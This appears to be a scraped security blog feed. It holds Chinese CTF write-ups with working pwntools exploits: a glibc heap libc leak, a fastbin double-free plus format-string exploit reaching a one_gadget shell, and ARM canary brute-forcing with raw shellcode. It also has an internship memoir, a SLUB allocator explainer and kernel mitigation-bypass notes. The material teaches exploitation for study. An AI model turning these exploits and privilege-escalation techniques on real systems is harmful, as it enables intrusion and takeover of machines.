这里首先利用的是scanf读入巨大的数将会利用堆块做暂存区。 我们直接在读入int时输入0x400*'9',实际上scanf会先分配一个0x410大小的块，用于存储用户的输入，然后判断大于INT_MAX，从而给用户返回全f，再把这个块给释放掉。 所以这题可以如此来拿到libc地址 读入long long，正常输入，并把它释放掉 pwndbg\u003e vis 0x555555559000 0x0000000000000000 0x0000000000000031 ........1....... \u003c-- fastbins[0x30][0 ] 0x555555559010 0x0000000000000000 0x0000000000000000 ................ 0x555555559020 0x0000000000000000 0x0000000000000000 ................ 0x555555559030 0x0000000000000000 0x0000000000020fd1 ................ \u003c-- Top chunk 读入int，输入巨大的数，直接把最上面的fastbin弄到smallbin里去了，同时留下了libc地址 pwndbg\u003e vis 0x555555559000 0x0000000000000000 0x0000000000000031 ........1....... \u003c-- smallbins[0x30][ 0] 0x555555559010 0x00002aaaab097b98 0x00002aaaab097b98 .{...*...{...*.. 0x555555559020 0x0000000000000000 0x0000000000000000 ................ 0x555555559030 0x0000000000000030 0x0000000000000020 0....... ....... 0x555555559040 0x00000000ffffffff 0x0000000000000000 ................ 0x555555559050 0x0000000000000000 0x0000000000020fb1 ................ \u003c-- Top chunk 当申请较大块(不在smallbin范围内)就会整理fastbin,先进unsortedbin再进smallbin if (in_smallbin_range (nb)) { idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) { if (victim == 0) /* initialization check */ malloc_consolidate (av); else { bck = victim-\u003ebk; if (__glibc_unlikely (bck-\u003efd != victim)) { errstr = \"malloc(): smallbin double linked list corrupted\"; goto errout; } set_inuse_bit_at_offset (victim, nb); bin-\u003ebk = bck; bck-\u003efd = bin; if (av != \u0026main_arena) victim-\u003esize |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } } /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else { idx = largebin_index (nb); if (have_fastchunks (av)) malloc_consolidate (av); } 读入long long, 输入+，它会直接跳过用户输入,至此我们得到了包含libc地址的堆块 pwndbg\u003e vis 0x555555559000 0x0000000000000000 0x0000000000000031 ........1....... 0x555555559010 0x00002aaaab097b98 0x00002aaaab097b98 .{...*...{...*.. 0x555555559020 0x0000000000000000 0x0000000000000000 ................ 0x555555559030 0x0000000000000030 0x0000000000000021 0.......!....... 0x555555559040 0x00000000ffffffff 0x0000000000000000 ................ 0x555555559050 0x0000000000000000 0x0000000000020fb1 ................ \u003c-- Top chunk 利用打印功能打印出来即可 当我们拿到libc地址,并且还有任意地址写'\\x00'的漏洞时,就可以通过修改stdin的buf_base低字节来扩大攻击面了.其buf_base到buf_end处是用户输入直接写入的位置,修改其低字节以后用户可以直接覆盖buf_base \u0026\u0026 0xffffffffffffff00到buf_end的内容了.而实际上这个地址就包含了整个stdin,所以我们下一步就可以任意指定buf_base与buf_end,实现任意地址写. 最后写的是free_hook,exp如下 from pwn import * context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h', '-p', '75'] filename = './test' libcname = './libc.so.6' ldname = './ld-2.23.so' ip = \"node1.pwn.tryout.hitctf.cn\" port = 30143 elf = ELF(filename) ru = lambda p, x : p.recvuntil(x) sn = lambda p, x : p.send(x) rl = lambda p : p.recvline() sl = lambda p, x : p.sendline(x) rv = lambda p, x=1024 : p.recv(numb = x) sa = lambda p, a, b : p.sendafter(a,b) sla = lambda p, a, b : p.sendlineafter(a,b) rr = lambda p, t : p.recvrepeat(t) LOCAL = 1 if len(sys.argv)==1 else 0 if LOCAL: io = process(filename, aslr=False) libc = elf.libc # debug=\"b *0x0000555555555496\\nb *0x000055555555549b\\nb *0x0000555555555517\" # gdb.attach(io, debug) # if LD_PRELOAD multiple libs, split with ","date":"2021-09-22","objectID":"/2021/09/lilac_ctf/:5:0","tags":null,"title":"招新赛 2021 出题总结(个人向)","uri":"/2021/09/lilac_ctf/"},{"categories":["PWN"],"content":"annoying | 未上线 菜单堆题,增删改打印功能齐全,但加了很多很烦的输入.并且所有chunk大小只能是0x20 delete功能中没有清空指针，show中printf有格式化字符串漏洞,但有次数限制导致只用格式化字符串没法打通 做法一源自2021国赛东北分区赛,在main_arena中留下合法size以便fastbin攻击 利用格式化字符串leak libc地址，然后double free来fastbin attack,类似于国赛small chunk思路，先利用fastbin表头在libc处留下0x31，然后打过去修改0x31的fastbin下一次分配地址，然后打到top_chunk把它改到malloc_hook,修改malloc_hook即可。 做法二为double free改show_cnt后即可多次触发格式化字符串利用格式化字符串任意地址读leak栈地址，并任意地址写修改返回地址。 做法二的exp如下,应该算是基础堆题了. \"\"\" x1do0 / Lilac \"\"\" from pwn import * context(arch = 'amd64', os = 'linux', endian = 'little') io = process('./pwn') def add(idx, size, con): io.sendlineafter(\"your choice\u003e\\n\", \"010101001011010000000000101\") io.sendlineafter(\"siahrdayrfase\", str(idx)) io.sendlineafter(\"as09q35hsaiua\", str(size)) io.sendlineafter(\"ioq5jrkdas71\", con) def remove(idx): io.sendlineafter(\"your choice\u003e\\n\", \"101000101000101010001010010\") io.sendlineafter(\"siahrdayrfase\", str(idx)) def show(idx): io.sendlineafter(\"your choice\u003e\\n\", \"111001000100010101001010010\") io.sendlineafter(\"siahrdayrfase\", str(idx)) def bye(): io.sendlineafter(\"your choice\u003e\\n\", \"000011010101010010101010101\") io.sendlineafter(\"Leave your name:\\n\", b'\\x00' * 0x18 + p64(0x31)) add(10, 0x20, '%9$p') show(10) io.recvuntil('\\n') elf_base = int(io.recv(14), 16) - 0x1044 print(hex(elf_base)) add(11, 0x20, 'a'*8) add(12, 0x20, 'b'*8) remove(11) remove(12) remove(11) add(13, 0x20, p64(elf_base+0x2020C0+0x10)) add(14, 0x20, 'c'*8) add(15, 0x20, 'd'*8) add(16, 0x20, p32(0xfffffff0)) add(0, 0x10, \"%8$p,%17$p\") show(0) io.recvuntil('\\n') stack_target = int(io.recvuntil(',', drop=True), 16) + 8 libc_addr = int(io.recv(14), 16) - 0x20840 print(hex(stack_target)) print(hex(libc_addr)) fh = 0x3c67a8 + libc_addr stack_target_0_4 = stack_target \u0026 0xffff print(hex(stack_target_0_4)) add(1, 0x10, '%' + str(stack_target_0_4) + 'c%18$hn') show(1) # 0x45226 execve(\"/bin/sh\", rsp+0x30, environ) # constraints: # rax == NULL # 0x4527a execve(\"/bin/sh\", rsp+0x30, environ) # constraints: # [rsp+0x30] == NULL # 0xf03a4 execve(\"/bin/sh\", rsp+0x50, environ) # constraints: # [rsp+0x50] == NULL # 0xf1247 execve(\"/bin/sh\", rsp+0x70, environ) # constraints: # [rsp+0x70] == NULL one = [0x45226 , 0x4527a, 0xf03a4, 0xf1247] one = [x + libc_addr for x in one] root = one[3] add(2, 0x10, f\"%{ root\u00260xffff }c%45$hn\") show(2) add(3, 0x10, '%' + str(stack_target_0_4 + 2) + 'c%18$hn') show(3) add(4, 0x10, f\"%{ (root\u003e\u003e16)\u00260xff }c%45$hhn\") show(4) bye() io.interactive() flag{aNNOY1NG_bUt_eAsy} ","date":"2021-09-22","objectID":"/2021/09/lilac_ctf/:6:0","tags":null,"title":"招新赛 2021 出题总结(个人向)","uri":"/2021/09/lilac_ctf/"},{"categories":["PWN"],"content":"年轻人的第一个ARM PWN | 未上线 启动脚本 ./qemu-arm -L . ./pwn qemu-arm下的栈溢出.但是开了canary,多线程按字节爆破canary以后去做ARM32架构的栈溢出 PUSH {R11,LR} ADD R11, SP, #4 SUB SP, SP, #0x28 ... STR R3, [R11,#var_8] # CANARY is here ... LDR R3, =(__stack_chk_guard_ptr - 0x10FB4) LDR R3, [R2,R3] ; __stack_chk_guard LDR R2, [R3] LDR R3, [R11,#var_8] EORS R2, R3, R2 MOV R3, #0 BEQ loc_754 # check CANARY BL __stack_chk_fail loc_754 SUB SP, R11, #4 POP {R11,PC} LR是返回地址，栈结构如下 ┌────────────────────────┐ │ high R11 │ R11(fp) │ │ ─────►├────────────────────────┤ │ │ LR │ │ ├────────────────────────┤ │ │ CANARY │ │ ├────────────────────────┤ │ │ │ │ │ BUFFER │ │ │ 0x20 │ │ low │ │ │ │ │ │ │ │ │ sp │ │ │ ─────►└────────────────────────┘ ▼ 思路一 ROP -\u003e 寄存器传参规则？ R0, R1, R2传参 fp存返回地址 不一定能返回（直接pop PC进入的函数不会返回，一般用BL func()与BX LR返回） 且gadget难找 思路二 ret2shellcode fp存返回地址 qemu栈地址固定（调试拿到） shellcode 没开nx, exp如下 \"\"\" x1do0 / Lilac \"\"\" from pwn import * context(arch = 'arm', os = 'linux', endian = 'little') io = process([\"qemu-arm\", \"-g\", \"23333\", \"-L\", \".\", \"./pwn\"]) # io = process([\"qemu-arm\", \"-L\", \".\", \"./pwn\"]) def leak_canary(): canary = b'\\x00' i = 0 while(len(canary)\u003c4): io.sendlineafter(\"\u003e\u003e\\n\", '1') io.sendafter(\"Input his/her name plz\\n\", b'a'*0x20 + canary + p8(i)) res = io.recvuntil(\"OK, your friend is coming!\\n\") if b\"stack smashing detected\" in res: print(\"[+] trying : \" + hex(i)) i = (i+1) % 256 else: canary += p8(i) print(\"[*] success : \" + hex(i)) i = 0 # sleep(0.1) print(b\"[*] We finally get canary : \" + canary) return canary canary = leak_canary() io.sendlineafter(\"\u003e\u003e\\n\", '3') sc = b\"\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\xa0\\x49\\x1a\\x0a\\x1c\\x42\\x72\\x0b\\x27\\x01\\xdf\\x2f\\x62\\x69\\x6e\\x2f\\x64\\x61\\x73\\x68\\x59\\xc0\\x46\" assert len(sc) == 0x20 pay = sc + canary + p32(0) + p32(0xfffdc44c) io.sendlineafter(\"Ohh I forget to ask your name!\\n\", pay) io.recvuntil(\"I love this bird.\\n\") io.interactive() flag{l3t_y0ur_fr1ends_dO_evilllll_th1ng} ","date":"2021-09-22","objectID":"/2021/09/lilac_ctf/:7:0","tags":null,"title":"招新赛 2021 出题总结(个人向)","uri":"/2021/09/lilac_ctf/"},{"categories":["Pause-and-Ponder"],"content":" 今年上半年很荣幸能通过华为奇点二进制安全实验室的面试，并在暑假进行为期两月的实习。  奇点实验室作为华为北研所的核心安全部门，由十几位安全技术狂热爱好者组成，组内人员包括科恩实验室创始人之一、前DEFCON CTF腾讯联队队长、前腾讯湛泸实验室技术高管等业内顶尖技术人员。组内任务对标长亭与科恩实验室，负责鸿蒙内核安全防护、车联网安全等华为技术核心，代表了国内最高的安全研究实验室水平。笔者抱着对安全技术的敬畏、渴求之心，与大佬们和谐相处了两个月，在此简略回顾一下（其实是因为教学秘书非要我提交实习回顾报告…）。  令人印象最深刻的是，实验室是高度自由的。职员只需要早上9:30到晚上6:00在公司即可，组内技术面也很广，给了我极大的选择自由。气氛也十分活跃轻松，大家经常一起吃饭、讨论技术问题，在这里并没有太多职位的高低之分，只有一个对技术执着追求的团体。  最初我参与到华为车联网安全的研究当中，主要涉及到车载蓝牙BLE协议的安全问题。自从科恩实验室几年前攻击特斯拉车载系统成功开始，车联网安全逐渐成为各大厂的安全重头。这是华为安全的一个长期技术目标，主要分为三个阶段，预计在下半年甚至近几年完成。第一阶段为信息收集。组内详细收集了国内外攻击案例、查阅近几年相关CVE，并尝试总结出常见攻击面。同时收集总结了国内外常见汽车品牌，包括大众、奥迪、奔驰等，并具体到车型，收集不同车型的具体架构信息、车载系统信息、蓝牙等短距协议的功能信息、ivi总线信息等。这是一个非常繁琐、枯燥的枯燥，并且这个阶段的完成质量会极大程度地影响后续的安全研究与技术突破，毕竟知己知彼百战不殆。笔者参与到收集宝马x7车型信息的工作中，在这个过程中了解到车载系统比想象中的复杂许多，并且从零开始了解了一些蓝牙BLE协议的知识，包括其协议栈、编程细节、时序等。第二阶段为逆向车联网APP及其协议，尝试寻找漏洞并完善攻击链。目前大部分车型都会联动手机APP，提供遥控开锁、控制等功能。我们会在测试机中下载各个车型的APP进行一定程度的逆向，通过对其协议与交互过程的逆向，尝试找到漏洞。实际上组内已经找到了一些针对BLE协议的漏洞，并进行中继攻击等，笔者也在这个过程中参与到安卓逆向工作。但这只是攻击链的第一环，后续还需要有针对车载系统的进一步提权攻击、对ivi网关的限制逃逸甚至是浏览器的0day漏洞等。整个过程涉及到对很多技术的深入理解，也正印证了那句老话“团结力量大”，整条攻击链在实验室中都能找到对其有钻研的技术大佬，整个过程也在如火如荼地同步进行。最后一个阶段将进行实车实验，尝试通过租车、公司购车等方式拿到具体车型，进行进一步地详细尝试，完善细节。  在这个过程中组内某内核安全大佬利用Mali GPU的0day漏洞完成了对安卓内核的越权，笔者深感佩服，遂即开启自己的Linux内核学习。内核态的学习异常艰难，笔者从CTF题入手慢慢复现常见漏洞利用技术，并尝试理解一些早年内核CVE，产出了一些技术概述文档。虽然只有一些微不足道的进步，但笔者内心十分感谢实验室给予我的自由、尊重与帮助。  值得一提的是，实验室会组织参与周会、每周一次的CTF训练、每周一到两次的技术分享与不定期的CTF比赛。可以看到组内成员技术交流是十分频繁的，毕竟大家的技术专长不尽相同，组内成员仿佛总有讨论不完的问题。我还记得参与到2021强网杯决赛的场景，实验室与浙大AAA战队合作，拿到了全国第三名的成绩。决赛赛制为cold down（CTF解题）与real world（现场演示）混合，题目质量很高，也很刺激。比赛刚开始没多久，实验室两位巨佬利用老练的技术积累迅速做出了real world中MacOS、Windows的系统提权，并打穿了浏览器，甚至拿到了系统的最高权限，因为主办方的要求被迫再降级到medium权限，笔者直呼太离谱了。笔者跟着AAA的小伙伴看了几道cold down，做完以后到了第一天傍晚，开始和实验室另一小伙伴一起all in一道real world: ESXI虚拟机逃逸。一开始我们找到了一些资料，发现了一些堆溢出漏洞。大家欣喜若狂，动手调试时才发现堆内存过于难以捉摸，虽然确实是有堆溢出，但是排堆过程令人头疼欲裂，实际应用中的内存结构并不是那么地清晰。不知不觉已经到了半夜，实验室开始投入更多人手，大家都从堆溢出入手慢慢地努力着。半夜两三点我太困就睡下了，第二天起来发现大家还是没有做出来这题，我们再次不断尝试直到比赛快要结束，这时有人发现了另外一个内核漏洞，可以导致加载任意驱动。大家渐渐投入到这个漏洞的利用编写中，但很遗憾在比赛过后的几天才得以利用成功。整个过程对我来说是弥足珍贵的，有幸能参与浙大与科恩长亭的混战，AAA从赛前训练动员、到中场会议调整人员、到半夜醒神动员都做的很好，也在陈少和耕铭等巨佬身上看到了去年DEFCON CTF夺冠的原因，A*O*E确实值得一个世界冠军。  现在回顾起来，庆幸自己有这个机会去了解实际安全背景下的安全挑战与机遇。但也很遗憾，由于个人的升学大计，笔者很难将精力与时间百分之百投入到实习工作中。尽管每天压力不小，但内心对于技术的追求与对大佬的向往之情从未减少。现在坐在工大的校园里，想起这段回忆有种返璞归真的奇妙感觉，也明白自己可能在很长一段时间内都不会再进入企业。最后，还是想对实验室给我提供无私、耐心帮助的大佬们说一声衷心地感谢，分别匆忙，见谅。 Question\r\r如果本文有任何私人、公司信息泄露，请立即与我告知，抱歉\r\r","date":"2021-09-15","objectID":"/2021/09/hssl/:0:0","tags":null,"title":"2021 华为夏季实习回顾","uri":"/2021/09/hssl/"},{"categories":["kernel"],"content":"CTF games have flourished in recent years. However, more GLIBC heap allocator exploit techiniques are becoming boring and meaningless, especially for games in China. Challenges are well-designed, deliberately constructed, leading to specific ways to solve them, which is actually further and further away from real world exploits. I started to aim more at Linux kernel memory allocator these days and gathered some imformation about Buddy System \u0026 SLUB hitherto. ","date":"2021-08-27","objectID":"/2021/08/slab_buddy_system0/:0:0","tags":null,"title":"SLUB \u0026 Buddy System in Linux Kernel","uri":"/2021/08/slab_buddy_system0/"},{"categories":["kernel"],"content":"Buddy System Buddy allocation system is an algorithm in which a larger memory block is divided into small parts to satisfy the request. This algorithm is used to give best fit[1]. There are couple of types of Buddy allocation system Binary buddy system Fibonacci buddy system Weighted buddy system Tertiary buddy system In Binary buddy system, memory is allocated and freed in PAGE_SIZE (e.g. 4K) using order to indicate size of chunks. Typically we have SIZE [of chunks of order=n] = 2^n * PAGE_SIZE We note an example from wiki[2]. Suppose minimum size of chunk is 64K and maximum order of chunk is 4, and user tries to allocate memory of 34K. This allocation could have occurred in the following manner The initial situation. Program A requests memory 34 K, order 0. No order 0 blocks are available, so an order 4 block is split, creating two order 3 blocks. Still no order 0 blocks available, so the first order 3 block is split, creating two order 2 blocks. Still no order 0 blocks available, so the first order 2 block is split, creating two order 1 blocks. Still no order 0 blocks available, so the first order 1 block is split, creating two order 0 blocks. Now an order 0 block is available, so it is allocated to A. Program B requests memory 66 K, order 1. An order 1 block is available, so it is allocated to B. Program C requests memory 35 K, order 0. An order 0 block is available, so it is allocated to C. Program D requests memory 67 K, order 1. No order 1 blocks are available, so an order 2 block is split, creating two order 1 blocks. Now an order 1 block is available, so it is allocated to D. Program B releases its memory, freeing one order 1 block. Program D releases its memory. One order 1 block is freed. Since the buddy block of the newly freed block is also free, the two are merged into one order 2 block. Program A releases its memory, freeing one order 0 block. Program C releases its memory. One order 0 block is freed. Since the buddy block of the newly freed block is also free, the two are merged into one order 1 block. Since the buddy block of the newly formed order 1 block is also free, the two are merged into one order 2 block. Since the buddy block of the newly formed order 2 block is also free, the two are merged into one order 3 block. Since the buddy block of the newly formed order 3 block is also free, the two are merged into one order 4 block. As you can see, what happens when a memory request is made is as follows: If memory is to be allocated Look for a memory slot of a suitable size (the minimal 2k block that is larger or equal to that of the requested memory) If it is found, it is allocated to the program If not, it tries to make a suitable memory slot. The system does so by trying the following: Split a free memory slot larger than the requested memory size into half If the lower limit is reached, then allocate that amount of memory Go back to step 1 (look for a memory slot of a suitable size) Repeat this process until a suitable memory slot is found If memory is to be freed Free the block of memory Look at the neighboring block – is it free too? If it is, combine the two, and go back to step 2 and repeat this process until either the upper limit is reached (all memory is freed), or until a non-free neighbour block is encountered Linux complements buddy system mainly by get_free_pages() and alloc_pages(). Memory allocated is continuous and return address of memory can be converted to physical address using const virts_to_phys() use /proc/buddyinfo and /proc/pagetypeinfo on your computer. x1do0@x1do0:~/kernel_learning/khop$ sudo cat /proc/pagetypeinfo Page block order: 9 Pages per block: 512 Free pages count per migrate type at order 0 1 2 3 4 5 6 7 8 9 1 Node 0, zone DMA, type Unmovable 0 0 0 1 1 1 1 0 1 0 Node 0, zone DMA, type Movable 0 0 0 0 0 0 0 0 0 1 Node 0, zone DMA, type Reclaimable 1 1 0 2 2 1 0 1 1 1 Node 0, zone DMA, type HighAtomic 0 0 0 0 0 0 0 0 0 0 Node 0, zone DMA, type CMA 0 0 0 0 0 0 0 0 0 0 Node ","date":"2021-08-27","objectID":"/2021/08/slab_buddy_system0/:1:0","tags":null,"title":"SLUB \u0026 Buddy System in Linux Kernel","uri":"/2021/08/slab_buddy_system0/"},{"categories":["kernel"],"content":"SLUB ","date":"2021-08-27","objectID":"/2021/08/slab_buddy_system0/:2:0","tags":null,"title":"SLUB \u0026 Buddy System in Linux Kernel","uri":"/2021/08/slab_buddy_system0/"},{"categories":["kernel"],"content":"Bird’s eye view Most of the time, memory allocated by buddy system is too large for users. To go to a step further, slub allocator will continue to divide and allocate memory into pieces, just like heap chunks in GLIBC. Linux modified SLAB codes and come up with a more efficient mechanism, SLUB[3], intended for memory allocation of kernel objects. There are many structures in slub and I paste an execellent picture of framework here. A more brief version. kmem_cache is like main_arena in GLIBC, and every kmem_cache contains many slab, each of which is made up of one or more consecutive pages and there are many object of identical size in every pages, which are exposed to users. Type cat /proc/slabinfo to see more info on your computer. / # cat /proc/slabinfo slabinfo - version: 2.1 # name \u003cactive_objs\u003e \u003cnum_objs\u003e \u003cobjsize\u003e \u003cobjperslab\u003e \u003cpagesperslab\u003e : tunables \u003climit\u003e \u003cbatchcount\u003e \u003csharedfactor\u003e : slabdata \u003cactiv\u003e fsverity_info 0 0 248 16 1 : tunables 0 0 0 : slabdata 0 0 0 ip6-frags 0 0 184 22 1 : tunables 0 0 0 : slabdata 0 0 0 PINGv6 0 0 1280 12 4 : tunables 0 0 0 : slabdata 0 0 0 RAWv6 12 12 1280 12 4 : tunables 0 0 0 : slabdata 1 1 0 UDPv6 0 0 1408 11 4 : tunables 0 0 0 : slabdata 0 0 0 tw_sock_TCPv6 0 0 248 16 1 : tunables 0 0 0 : slabdata 0 0 0 request_sock_TCPv6 0 0 304 13 1 : tunables 0 0 0 : slabdata 0 0 0 TCPv6 0 0 2432 13 8 : tunables 0 0 0 : slabdata 0 0 0 kcopyd_job 0 0 3312 9 8 : tunables 0 0 0 : slabdata 0 0 0 dm_uevent 0 0 2632 12 8 : tunables 0 0 0 : slabdata 0 0 0 scsi_sense_cache 32 32 128 32 1 : tunables 0 0 0 : slabdata 1 1 0 mqueue_inode_cache 8 8 1024 8 2 : tunables 0 0 0 : slabdata 1 1 0 fuse_request 0 0 144 28 1 : tunables 0 0 0 : slabdata 0 0 0 fuse_inode 0 0 896 9 2 : tunables 0 0 0 : slabdata 0 0 0 ecryptfs_inode_cache 0 0 1024 8 2 : tunables 0 0 0 : slabdata 0 0 0 ecryptfs_file_cache 0 0 16 256 1 : tunables 0 0 0 : slabdata 0 0 0 ecryptfs_auth_tok_list_item 0 0 896 9 2 : tunables 0 0 0 : slabdata 0 0 0 fat_inode_cache 0 0 744 11 2 : tunables 0 0 0 : slabdata 0 0 0 fat_cache 0 0 40 102 1 : tunables 0 0 0 : slabdata 0 0 0 squashfs_inode_cache 0 0 768 10 2 : tunables 0 0 0 : slabdata 0 0 0 jbd2_journal_handle 0 0 48 85 1 : tunables 0 0 0 : slabdata 0 0 0 jbd2_journal_head 0 0 120 34 1 : tunables 0 0 0 : slabdata 0 0 0 jbd2_revoke_table_s 0 0 16 256 1 : tunables 0 0 0 : slabdata 0 0 0 ext4_inode_cache 0 0 1096 29 8 : tunables 0 0 0 : slabdata 0 0 0 ext4_allocation_context 0 0 128 32 1 : tunables 0 0 0 : slabdata 0 0 0 ext4_system_zone 0 0 40 102 1 : tunables 0 0 0 : slabdata 0 0 0 ext4_io_end 0 0 64 64 1 : tunables 0 0 0 : slabdata 0 0 0 ext4_pending_reservation 0 0 32 128 1 : tunables 0 0 0 : slabdata 0 0 0 ext4_extent_status 0 0 40 102 1 : tunables 0 0 0 : slabdata 0 0 0 mbcache 0 0 56 73 1 : tunables 0 0 0 : slabdata 0 0 0 userfaultfd_ctx_cache 0 0 256 16 1 : tunables 0 0 0 : slabdata 0 0 0 dnotify_struct 0 0 32 128 1 : tunables 0 0 0 : slabdata 0 0 0 pid_namespace 0 0 208 19 1 : tunables 0 0 0 : slabdata 0 0 0 ip4-frags 0 0 200 20 1 : tunables 0 0 0 : slabdata 0 0 0 xfrm_dst_cache 0 0 384 10 1 : tunables 0 0 0 : slabdata 0 0 0 xfrm_state 0 0 768 10 2 : tunables 0 0 0 : slabdata 0 0 0 PING 8 8 1024 8 2 : tunables 0 0 0 : slabdata 1 1 0 RAW 8 8 1024 8 2 : tunables 0 0 0 : slabdata 1 1 0 tw_sock_TCP 0 0 248 16 1 : tunables 0 0 0 : slabdata 0 0 0 request_sock_TCP 0 0 304 13 1 : tunables 0 0 0 : slabdata 0 0 0 TCP 0 0 2304 14 8 : tunables 0 0 0 : slabdata 0 0 0 hugetlbfs_inode_cache 25 25 632 25 4 : tunables 0 0 0 : slabdata 1 1 0 dquot 0 0 256 16 1 : tunables 0 0 0 : slabdata 0 0 0 eventpoll_pwq 0 0 72 56 1 : tunables 0 0 0 : slabdata 0 0 0 dax_cache 10 10 768 10 2 : tunables 0 0 0 : slabdata 1 1 0 request_queue 15 15 2104 15 8 : tunables 0 0 0 : slabdata 1 1 0 biovec-max 32 32 4096 8 8 : tunables 0 0 0 : slabdata 4 4 0 biovec-128 8 8 2048 8 4 : tunables 0 0 0 : slabdata 1 1 0 biovec-64 8 8 1024 8 2 : tunables 0 0 0 : slabdata 1 1 0 khugepaged_mm_slot 0 0 112 36 1 : tunables 0 0 0 : slabdata 0 0 0 use","date":"2021-08-27","objectID":"/2021/08/slab_buddy_system0/:2:1","tags":null,"title":"SLUB \u0026 Buddy System in Linux Kernel","uri":"/2021/08/slab_buddy_system0/"},{"categories":["kernel"],"content":"APIs There are some important APIs for users. create a kmem_cache with specific size and name. struct kmem_cache * kmem_cache_create ( const char *name, size_t size, size_t align, unsigned long flags, void (*ctor(void*, struct kmem_cache *, unsigned long), void (*dtor(void*, struct kmem_cache *, unsigned long)); create a object in specific kmem_cache void * kmem_cache_alloc (struct kmem_cache * cachep, gfp_t flags); free a specific object in specific kmem_cache void kmem_cache_free (struct kmem_cache * cachep, void * objp); allocate a object in kmalloc-***. Kernel will find a best matched kmem_cache, and if sizes required are more than the biggest size of them (8K), buddy system will help to allocator the memory directly. void * kmalloc (size_t size, gfp_t flags); free a object. Kernel will find the page of the object, read out pointer of the object and copy to a freelist, with fd pointer points to next freed object, same as tcache in GLIBC. void kfree (const void * objp); ","date":"2021-08-27","objectID":"/2021/08/slab_buddy_system0/:2:2","tags":null,"title":"SLUB \u0026 Buddy System in Linux Kernel","uri":"/2021/08/slab_buddy_system0/"},{"categories":["kernel"],"content":"Details Let’s go deep into kmalloc-***. As you can see, the smallest is kmalloc-8 and the largest is kmalloc-8k with size of 2^3 to 2^13 bytes. In older kernel version, max size is 2^11 bytes. Details are in the following picture. kmem_cache_cpu is like a supermarket freelist is the header of freed object lists page is the header of allocated object lists And kmem_cache_node is the depository. partial points to partially allocated slub lists. full points to fully allocated slub lists. We will go through it step by step together. Allocating process kmem_cache_node and kmem_cache_cpu contain no slub. After an allocation request, buddy system allocates a large chunk of memory, divides it into pieces, returns one piece to users. Now kmem_cache_cpu has a slub ready to use with freelist and page point to correct places. Users continue to require allocation After slab of kmem_cache_cpu is filled with objects, the next allocation will trigger a swtich, putting the previous full slab into the full lists of kmem_cache_node and one not full slab from partial lists to kmem_cache_cpu, and then return a object to users. And finally, all slabs are full. Buddy system stands out again and gives us a brand new empty slab. Now you may want to ask, how can a slab be added into partial lists? Well, follow me with the process of freeing these objects. Freeing process Depending on where the object to be free is, there are some kinds of situation. In kmem_cache_cpu, Kernel will put it from page list to freelist list. In not full slab of partial list in kmem_cache_node, mark the object freed. In full slab of full list, free it and put the slab into partial list. What’s more, if a slub is entirely empty, the whole slab will be freed. ","date":"2021-08-27","objectID":"/2021/08/slab_buddy_system0/:2:3","tags":null,"title":"SLUB \u0026 Buddy System in Linux Kernel","uri":"/2021/08/slab_buddy_system0/"},{"categories":["kernel"],"content":"exploits If there is a use-after-free slab vulnerability in kernel mode, modifying fd to attack mprobe_path may be an easy way to exploit. If there is an overflow vulnerability in slab structure, the first thing is to allocate lots of objects to make later objects we allocate continuous. By overwriting the content of next ojbect, we can achieve our goal. For example, use fork to arrange cred structure of child process to the nexe object and zero it out by overflowing the previous object. In [5], author uses shmid_kernel structure to get root privilege. Ref [1] https://www.geeksforgeeks.org/operating-system-allocating-kernel-memory-buddy-system-slab-system/ [2] https://en.wikipedia.org/wiki/Buddy_memory_allocation [3] https://en.wikipedia.org/wiki/SLUB_(software) [4] https://blog.csdn.net/lukuen/article/details/6935068 [5] https://www.cnblogs.com/bittorrent/p/3266308.html ","date":"2021-08-27","objectID":"/2021/08/slab_buddy_system0/:2:4","tags":null,"title":"SLUB \u0026 Buddy System in Linux Kernel","uri":"/2021/08/slab_buddy_system0/"},{"categories":["kernel"],"content":"Like user mode, there are also couples of ways of mitigation against exploits in Linux kernel. Here is a list of mitigation in kernel mode and methods to bypass some of them. ","date":"2021-08-25","objectID":"/2021/08/kernel_mitigation_bypass/:0:0","tags":null,"title":"Linux Kernel Mitigation \u0026 Bypass","uri":"/2021/08/kernel_mitigation_bypass/"},{"categories":["kernel"],"content":"0x00 CANARY Same as user mode, lying at rbp-8 (or ebp-4 in 32 bits machine) ","date":"2021-08-25","objectID":"/2021/08/kernel_mitigation_bypass/:1:0","tags":null,"title":"Linux Kernel Mitigation \u0026 Bypass","uri":"/2021/08/kernel_mitigation_bypass/"},{"categories":["kernel"],"content":"0x01 KASLR Same as ASLR in user mode, adding random and varied PAGE SIZE to kernel and module loading address when booted. ","date":"2021-08-25","objectID":"/2021/08/kernel_mitigation_bypass/:2:0","tags":null,"title":"Linux Kernel Mitigation \u0026 Bypass","uri":"/2021/08/kernel_mitigation_bypass/"},{"categories":["kernel"],"content":"0x02 FG_KASLR Quite new techniques patched to strengthen KASLR, provides an address randomization at Function Granular rather than module granular at KASLR, which means even offset of the function would vary from time to time. Two way to bypass it Kernel symbols are not affected by FG_KASLR, so we can compute the actual address of functions. e.g. Address of commit_creds = Address of ksymtab_commit_creds + value_offset of it struct kernel_symbol { int value_offset; int name_offset; int namespace_offset; }; modprobe_path and swapgs_restore_regs_and_return_to_usermode are unaffected by FG_KASLR More details about exploits using modprobe_path were mentioned in the previous article [1] and [2] ","date":"2021-08-25","objectID":"/2021/08/kernel_mitigation_bypass/:3:0","tags":null,"title":"Linux Kernel Mitigation \u0026 Bypass","uri":"/2021/08/kernel_mitigation_bypass/"},{"categories":["kernel"],"content":"0x03 SMEP User mode codes are not permmited to execute in kernel mode (ring 0). Typically Return-to-user will no longer work out because of it. But we can still find gadgets to do Return-Oriented-Programming in kernel mode. ","date":"2021-08-25","objectID":"/2021/08/kernel_mitigation_bypass/:4:0","tags":null,"title":"Linux Kernel Mitigation \u0026 Bypass","uri":"/2021/08/kernel_mitigation_bypass/"},{"categories":["kernel"],"content":"0x04 SMAP User mode data should be unaccessible in kernel mode. x1do0@x1do0:~$ cat /proc/cpuinfo | grep smep | grep smap flags : fpu vme de pse tsc msr pae mce cx8 apic sep 